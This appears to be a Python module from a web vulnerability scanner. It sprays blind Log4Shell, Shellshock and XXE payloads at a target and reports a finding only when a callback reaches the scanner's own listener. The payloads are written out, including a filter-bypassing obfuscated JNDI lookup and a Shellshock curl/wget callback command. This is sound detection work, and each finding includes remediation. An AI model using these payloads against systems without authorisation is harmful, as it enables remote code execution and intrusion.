"""Blind injection spray - only a real callback counts (CWE-917/78/611).

Log4Shell, Shellshock and blind XXE share one property: the response
proves nothing. Each payload asks the target to reach a listener we
control, and a finding is written only when that callback arrives. It
is the same zero-false-positive rule as the SSRF check - without proof,
coverage is noise.

The listener ships with summit: `summit scan --oob-listen`. Log4Shell
speaks LDAP to the raw listener; Shellshock and blind XXE speak HTTP.
"""

from __future__ import annotations

from typing import Callable

from ...http.client import HttpClient
from ...http.models import HttpRequest
from ...oob import new_token
from ..core import Finding
from ..runtime import deep
from .xxe import is_xml_candidate

_LOG4J_HEADERS = ("User-Agent", "X-Forwarded-For", "Referer")


def _send(client: HttpClient, request: HttpRequest) -> None:
    try:
        client.send(request)
    except Exception:
        pass


def _log4j_payload(jndi_base: str, token: str, obfuscated: bool = False) -> str:
    host = jndi_base.split("://", 1)[-1].strip("/")
    prefix = "${${lower:j}ndi" if obfuscated else "${jndi"
    return f"{prefix}:ldap://{host}/{token}}}"


def _shellshock_payload(callback: str) -> str:
    command = (
        f"curl -s -m 5 {callback} >/dev/null 2>&1 || "
        f"wget -q -O- {callback} >/dev/null 2>&1"
    )
    return "() { :; }; " + command


def _xxe_payload(callback: str) -> bytes:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<!DOCTYPE summit [\n"
        f'  <!ENTITY xxe SYSTEM "{callback}">\n'
        "]>\n"
        "<summit><data>&xxe;</data></summit>"
    ).encode("utf-8")


def _xml_candidates(base_url: str, forms: list[dict]) -> list[str]:
    candidates: list[str] = []
    for form in forms:
        if (form.get("method") or "").upper() != "POST":
            continue
        action = form.get("action") or ""
        fields = list((form.get("fields") or {}).keys())
        if action and is_xml_candidate(action, fields):
            candidates.append(action)
    if not candidates:
        candidates.append(base_url.rstrip("/") + "/xml")
    return candidates[:4]


def run_oob_spray(
    client: HttpClient,
    base_url: str,
    forms: list[dict],
    callback_base: str,
    hit_checker: Callable[[str], bool],
    jndi_base: str = "",
) -> list[Finding]:
    """Spray blind vectors; report only vectors that produced a callback."""
    findings: list[Finding] = []
    if not callback_base:
        return findings
    callback_base = callback_base.rstrip("/")

    if jndi_base:
        token = new_token("log4j")
        payload = _log4j_payload(jndi_base, token)
        _send(client, HttpRequest(
            method="GET",
            url=base_url,
            headers={name: payload for name in _LOG4J_HEADERS},
        ))
        if hit_checker(token):
            findings.append(Finding(
                check_id="log4shell",
                title="Log4Shell (JNDI injection, OOB-confirmed)",
                severity="critical",
                url=base_url,
                confidence="confirmed",
                detail=(
                    "The logged headers containing a JNDI lookup made the server resolve "
                    "our listener. This is CVE-2021-44228 behaviour: a username, user agent "
                    "or forwarded header can load attacker-controlled code."
                ),
                evidence=f"JNDI lookup reached the raw listener for token {token} "
                         f"(headers: {', '.join(_LOG4J_HEADERS)})",
                remediation=(
                    "Upgrade Log4j to 2.17.1+ (or 2.12.4 / 2.3.2 for legacy branches), "
                    "remove JndiLookup from the classpath, and never log unvalidated headers."
                ),
            ))

        if deep():
            token = new_token("log4j")
            payload = _log4j_payload(jndi_base, token, obfuscated=True)
            _send(client, HttpRequest(
                method="GET",
                url=base_url,
                headers={"User-Agent": payload, "X-Forwarded-For": payload},
            ))
            if hit_checker(token):
                findings.append(Finding(
                    check_id="log4shell",
                    title="Log4Shell (JNDI injection, obfuscation bypass, OOB-confirmed)",
                    severity="critical",
                    url=base_url,
                    confidence="confirmed",
                    detail=(
                        "The lowercase-obfuscated JNDI lookup resolved to our listener, so "
                        "the deployed Log4j version is exploitable even behind filters that "
                        "block the plain `${jndi:` string."
                    ),
                    evidence=f"obfuscated JNDI lookup reached the raw listener for token {token}",
                    remediation=(
                        "Upgrade Log4j to 2.17.1+ and remove JndiLookup from the classpath."
                    ),
                ))

    token = new_token("shell")
    callback = f"{callback_base}/{token}"
    _send(client, HttpRequest(
        method="GET",
        url=base_url,
        headers={"User-Agent": _shellshock_payload(callback)},
    ))
    if hit_checker(token):
        findings.append(Finding(
            check_id="shellshock",
            title="Shellshock (Bash command injection, OOB-confirmed)",
            severity="critical",
            url=base_url,
            confidence="confirmed",
            detail=(
                "A crafted User-Agent defined a Bash function and the shell ran the "
                "trailing command: our listener received the callback. This is CVE-2014-6271 "
                "- arbitrary command execution on the web server."
            ),
            evidence=f"callback received for token {token} after the crafted User-Agent",
            remediation=(
                "Patch Bash (the Shellshock fixes), and stop passing request headers into "
                "shell commands or CGI environment variables."
            ),
        ))

    for url in _xml_candidates(base_url, forms):
        token = new_token("xxe")
        callback = f"{callback_base}/{token}"
        _send(client, HttpRequest(
            method="POST",
            url=url,
            headers={
                "Content-Type": "application/xml",
                "Accept": "application/xml, text/xml, */*",
            },
            body=_xxe_payload(callback),
        ))
        if hit_checker(token):
            findings.append(Finding(
                check_id="xxe-oob",
                title="Blind XXE (external entity fetch, OOB-confirmed)",
                severity="high",
                url=url,
                confidence="confirmed",
                detail=(
                    "The XML parser fetched our external entity. Even with no file "
                    "content in the response, entity resolution proves the parser is "
                    "vulnerable - it reaches internal services and can exfiltrate files "
                    "through out-of-band channels."
                ),
                evidence=f"external entity fetched by the target for token {token}",
                remediation=(
                    "Disable external entities and DTD processing in the XML parser "
                    "(defusedxml, disallow-doctype-decl)."
                ),
            ))
            break

    return findings
